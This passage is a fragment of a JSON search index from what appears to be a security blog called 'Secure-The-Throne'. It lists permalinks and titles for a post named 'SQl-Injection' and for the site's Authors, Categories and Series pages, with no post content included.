2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741343014156-sql-injection/","section":"Posts","summary":"","title":"SQl-Injection","type":"posts"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/series/","section":"Series","summary":"","title":"Series","type":"series"}]